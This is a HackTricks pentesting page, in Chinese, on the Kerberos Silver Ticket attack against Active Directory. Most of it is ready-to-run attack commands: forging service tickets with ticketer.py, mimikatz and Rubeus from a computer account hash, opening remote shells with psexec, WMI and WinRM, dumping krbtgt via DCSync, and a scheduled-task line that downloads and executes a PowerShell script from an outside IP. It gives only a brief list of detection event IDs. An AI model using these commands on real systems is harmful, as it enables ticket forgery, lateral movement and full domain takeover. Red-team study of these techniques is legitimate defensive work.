# 银票

<details>

<summary><strong>从零开始学习AWS黑客攻击直至成为专家，通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS 红队专家)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在 **HackTricks中看到您的公司广告** 或 **下载HackTricks的PDF版本**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

如果您对**黑客职业**感兴趣，并且想要黑入不可黑的系统 - **我们正在招聘！**（_需要流利的波兰语书写和口语_）。

{% embed url="https://www.stmcyber.com/careers" %}

## 银票攻击

银票攻击基于**一旦拥有服务的NTLM哈希（如**PC账户哈希**），就制作一个有效的TGS**。因此，可以通过伪造自定义TGS**作为任何用户**来**访问该服务**。

在这种情况下，拥有了**计算机账户的NTLM哈希**（在AD中相当于用户账户）。因此，可以**制作**一张**票据**，以便通过SMB服务以**管理员**权限**进入该机器**。计算机账户默认每30天重置一次密码。

还必须考虑到使用AES Kerberos密钥（AES128和AES256）伪造票据是可能的，也是**更可取的**（操作安全）。要了解如何生成AES密钥，请阅读：[MS-KILE的第4.4节](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/936a4878-9462-4753-aac8-087cd3ca4625) 或 [Get-KerberosAESKey.ps1](https://gist.github.com/Kevin-Robertson/9e0f8bfdbf4c1e694e6ff4197f0a4372)。

{% code title="Linux" %}
```bash
python ticketer.py -nthash b18b4b218eccad1c223306ea1916885f -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park -spn cifs/labwws02.jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@labwws02.jurassic.park -k -no-pass
```
```markdown
在Windows中，**Mimikatz**可用于**制作** **票据**。接下来，使用**Rubeus**将票据**注入**，最后可以通过**PsExec**获得远程shell。
```
{% endcode %}

{% code title="Windows" %}
```bash
#Create the ticket
mimikatz.exe "kerberos::golden /domain:jurassic.park /sid:S-1-5-21-1339291983-1349129144-367733775 /rc4:b18b4b218eccad1c223306ea1916885f /user:stegosaurus /service:cifs /target:labwws02.jurassic.park"
#Inject in memory using mimikatz or Rubeus
mimikatz.exe "kerberos::ptt ticket.kirbi"
.\Rubeus.exe ptt /ticket:ticket.kirbi
#Obtain a shell
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd

#Example using aes key
kerberos::golden /user:Administrator /domain:jurassic.park /sid:S-1-5-21-1339291983-1349129144-367733775 /target:labwws02.jurassic.park /service:cifs /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /ticket:srv2-cifs.kirbi
```
{% endcode %}

**CIFS** 服务允许您**访问受害者的文件系统**。您可以在此处找到其他服务：[**https://adsecurity.org/?page\_id=183**](https://adsecurity.org/?page\_id=183)**。**例如，您可以使用 **HOST 服务** 在计算机上创建一个 _**schtask**_。然后，您可以尝试列出受害者的任务来检查是否成功：`schtasks /S <hostname>`，或者您可以使用 **HOST 和** **RPCSS 服务** 在计算机上执行 **WMI** 查询，测试方法是：`Get-WmiObject -Class win32_operatingsystem -ComputerName <hostname>`

### 缓解措施

Silver ticket 事件 ID（比 golden ticket 更隐蔽）：

* 4624：账户登录
* 4634：账户注销
* 4672：管理员登录

[**关于 Silver Tickets 的更多信息在 ired.team**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)

## 可用服务

| 服务类型                                   | 服务 Silver Tickets                                                       |
| ------------------------------------------ | ------------------------------------------------------------------------ |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                  |
| PowerShell 远程操作                        | <p>HOST</p><p>HTTP</p><p>取决于操作系统，也可能有：</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>在某些情况下，您可以直接请求：WINRM</p>         |
| 计划任务                                   | HOST                                                                     |
| Windows 文件共享，也包括 psexec            | CIFS                                                                     |
| LDAP 操作，包括 DCSync                     | LDAP                                                                     |
| Windows 远程服务器管理工具                 | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                       |
| Golden Tickets                             | krbtgt                                                                   |

使用 **Rubeus**，您可以使用以下参数请求所有这些票证：

* `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

## 滥用服务票证

在以下示例中，假设您通过模仿管理员账户检索到了票证。

### CIFS

有了这张票证，如果 **SMB**（如果暴露了的话）允许，您将能够访问 `C$` 和 `ADMIN$` 文件夹，并且只需做类似以下操作即可将文件复制到远程文件系统的某个部分：
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
您还可以使用 **psexec** 在主机内获取 shell 或执行任意命令：

{% content-ref url="../ntlm/psexec-and-winexec.md" %}
[psexec-and-winexec.md](../ntlm/psexec-and-winexec.md)
{% endcontent-ref %}

### 主机

拥有此权限，您可以在远程计算机上生成计划任务并执行任意命令：
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

使用这些票据，您可以**在受害系统中执行WMI**：
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
在以下页面中查找有关 **wmiexec** 的**更多信息**：

{% content-ref url="../ntlm/wmicexec.md" %}
[wmicexec.md](../ntlm/wmicexec.md)
{% endcontent-ref %}

### 主机 + WSMAN (WINRM)

通过 winrm 访问一台计算机，您可以**访问它**，甚至可以获得 PowerShell：
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
查看以下页面以了解**更多使用 winrm 与远程主机连接的方法**：

{% content-ref url="../ntlm/winrm.md" %}
[winrm.md](../ntlm/winrm.md)
{% endcontent-ref %}

{% hint style="warning" %}
请注意，要访问远程计算机，**winrm 必须处于活动状态并且正在监听**。
{% endhint %}

### LDAP

拥有此权限，您可以使用 **DCSync** 导出 DC 数据库：
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**了解更多关于DCSync** 的信息，请查看以下页面：

{% content-ref url="dcsync.md" %}
[dcsync.md](dcsync.md)
{% endcontent-ref %}

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

如果你对**黑客职业**感兴趣，并且想要攻破不可攻破的目标 - **我们正在招聘！**（_需要流利的波兰语书写和口语_）。

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>从零开始学习AWS黑客技术，成为</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果你想在**HackTricks上看到你的公司广告**或者**下载HackTricks的PDF版本**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来**分享你的黑客技巧。

</details>
